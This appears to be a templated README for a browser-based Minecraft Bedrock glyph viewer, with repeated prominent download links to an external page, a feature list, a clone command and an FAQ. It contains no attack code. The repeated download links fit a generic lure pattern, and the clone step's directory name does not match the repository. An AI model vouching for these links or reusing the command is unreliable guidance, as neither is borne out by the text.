# Bedrock Glyph Viewer – glyph viewer 2026

> A browser-based tool for browsing, searching, and exporting Minecraft Bedrock glyphs from resource packs, built for map makers and addon developers working with unicode font textures.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coopervictor1998/bedrock-glyph-viewer-2026?style=flat-square)](https://github.com/coopervictor1998/bedrock-glyph-viewer-2026)

---

<p align="center">
  <a href="https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/">
    <img src="https://img.shields.io/badge/Download-Bedrock%20Glyph%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Bedrock Glyph Viewer">
  </a>
</p>

> **[Direct Download – Bedrock Glyph Viewer v1.0.0](https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/)**

---

[Download Latest Build](https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/)

---

## What Bedrock Glyph Viewer Does

This tool streamlines the process of inspecting and extracting glyph data from Minecraft Bedrock resource packs. Instead of manually opening texture files or guessing unicode mappings, you load entire glyph sheets and instantly see every character alongside its code point. It's especially valuable for creators working with custom fonts, language packs, or any project requiring precise unicode character placement.

The interface follows mobile-first design principles and runs entirely in the browser with no server-side dependencies. Whether you're debugging a resource pack on a tablet or compiling glyph references on a desktop, the responsive dark UI adapts to your workflow. Zero external libraries ensure fast page loads and reliable performance across all modern browsers.

---

## Key Features

- **Multi-sheet loading** – Import multiple glyph sheets at once and switch between them without reloading
- **Unicode search** – Locate specific characters by code point, name, or partial pattern across all loaded sheets
- **Cell detail view** – Click any glyph to see its full unicode value, hex representation, and pixel dimensions
- **Unicode converter** – Convert between decimal, hexadecimal, and character representations in real time
- **Quick load buttons** – Pre-configured shortcuts for common Bedrock resource pack glyph layouts
- **Copy to clipboard** – Export individual glyph references or entire sheet mappings with a single click
- **Mobile-first dark UI** – Optimized touch targets and reduced eye strain during extended browsing sessions
- **Zero dependencies** – Pure HTML, CSS, and JavaScript with no frameworks or external resources

---

## Getting Started

Clone the repository or download the latest build from the link above.

```bash
git clone https://github.com/coopervictor1998/bedrock-glyph-viewer-2026.git
cd bedrock-glyph-viewer
```

No build steps required. Open `index.html` in any modern web browser to start using the viewer immediately.

---

## How to Use

1. Launch the viewer in your browser
2. Click the **Load Sheets** button to import glyph texture files from your resource pack
3. Browse the character grid or use the search bar to find specific glyphs
4. Click any glyph to inspect its unicode details and copy its reference
5. Use the converter tool to translate between different unicode notation formats

For quick access, use the preset buttons to load standard Bedrock glyph layouts without manual file selection.

---

## Configuration

All settings are stored in the browser's local storage. The viewer remembers your last loaded sheets, search preferences, and UI state between sessions. No server-side configuration or external databases are required.

To reset all settings, clear your browser's local storage for this domain or use the **Reset** button in the viewer's settings panel.

---

## System Requirements

- A modern web browser (Chrome, Firefox, Safari, Edge, or any Chromium-based browser)
- JavaScript enabled
- No internet connection required after initial download
- Sufficient memory for loading large glyph sheets (recommended 512 MB+ free RAM for resource packs with many textures)
- Screen width of at least 320px for mobile use

---

## Frequently Asked Questions

**How do I update to a newer version?**  
Download the latest build from the repository and replace your existing files. Your local settings will persist because they are stored in the browser.

**Can I use this with custom resource packs?**  
Yes. The viewer accepts any properly formatted glyph sheet image. For best results, ensure your texture follows the standard Bedrock glyph grid layout.

**Why aren't my glyphs displaying correctly?**  
Verify that your resource pack uses the correct unicode mapping and sheet dimensions. The viewer expects glyphs to be arranged in a consistent grid with proper character indexes.

**Does this tool modify my resource pack files?**  
No. The viewer is read-only and does not alter any files on your system. All operations happen in memory or your browser's local storage.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
